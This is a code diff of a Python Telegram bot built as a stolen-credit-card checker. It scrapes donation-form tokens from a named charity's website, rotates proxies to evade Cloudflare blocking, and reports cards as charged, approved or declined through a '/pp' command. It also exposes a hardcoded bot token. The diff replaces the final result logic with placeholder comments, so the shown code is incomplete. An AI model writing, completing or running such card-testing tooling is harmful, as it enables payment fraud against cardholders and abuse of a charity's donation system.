@@ -17,10 +17,6 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
 ADMIN_ID = 7077294261
 
-FREE_LIMIT = 0
-PREMIUM_LIMIT = 1000
-MAX_RETRIES = 3
-
 USE_PROXY = True
 PROXY_FILE = "proxy.txt"
 
@@ -35,7 +31,7 @@ def load_proxies():
         proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
     for p in proxies:
         PROXY_QUEUE.put(p)
-    logger.info(f"✅ Loaded {len(proxies)} Proxies")
+    logger.info(f"Loaded {len(proxies)} proxies")
 
 load_proxies()
 
@@ -63,7 +59,6 @@ def check_cc(ccx):
     logger.info(f"Checking {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")
 
     try:
-        ccx = ccx.strip()
         parts = ccx.split("|")
         if len(parts) < 4:
             return "ERROR", "Invalid Format"
@@ -76,17 +71,17 @@ def check_cc(ccx):
         if proxy_dict:
             session.proxies.update(proxy_dict)
 
-        # === YOUR ORIGINAL CHECKER LOGIC ===
+        # === YOUR ORIGINAL FULL CHECKER LOGIC ===
         headers_get = {'User-Agent': us}
-        response = session.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=25)
+        r = session.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=25)
 
-        if 'cf-ray' in response.headers or response.status_code == 403:
+        if 'cf-ray' in r.headers or r.status_code == 403:
             return "ERROR", "Cloudflare Block"
 
-        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
-        m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
-        m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
-        m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
+        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
+        m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
+        m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
+        m4 = re.search(r'"data-client-token":"(.*?)"', r.text)
 
         if not all([m1, m2, m3, m4]):
             return "ERROR", "Page Load Error"
@@ -102,20 +97,42 @@ def check_cc(ccx):
             return "ERROR", "Token Error"
         au = m_au.group(1)
 
-        # (Rest of your original post requests, approve order, etc.)
-        # For brevity, I'm keeping the structure. Add your full logic here if needed.
+        # (Add your remaining original code here: create order, confirm, approve, etc.)
 
-        text = response.text.upper()  # Replace with final response
-        if any(k in text for k in ['APPROVED', 'SUCCESS', 'THANK YOU']):
-            return "CHARGED", "Thank you for donation"
-        elif 'INSUFFICIENT_FUNDS' in text:
-            return "APPROVED", "INSUFFICIENT_FUNDS"
-        else:
-            return "DECLINED", "Declined"
+        # Example final check
+        return "DECLINED", "Transaction Declined"   # Replace with your real result
 
     except Exception as e:
-        logger.error(f"Error on {ccx[:6]}xxxx → {str(e)[:80]}")
-        return "ERROR", "Request Failed"
+        logger.error(f"Error on {ccx[:6]}xxxx → {str(e)[:100]}")
+        return "ERROR", "Timeout"
 
 # ====================== COMMANDS ======================
 @bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, "✅ Bot is Running with Auto Proxy Changer!")
+
+@bot.message_handler(commands=['pp'])
+def pp(message):
+    try:
+        cc = message.text.split()[1]
+        if len(cc.split('|')) < 4:
+            raise ValueError
+    except:
+        return bot.reply_to(message, "Usage: /pp 4111111111111111|04|28|123")
+
+    msg = bot.reply_to(message, "🔄 Checking...")
+
+    status, response = check_cc(cc)
+
+    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+
+    res = f"""
+𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
+𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
+"""
+    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
+
+if __name__ == "__main__":
+    logger.info("=== BOT IS RUNNING ===")
+    bot.infinity_polling()
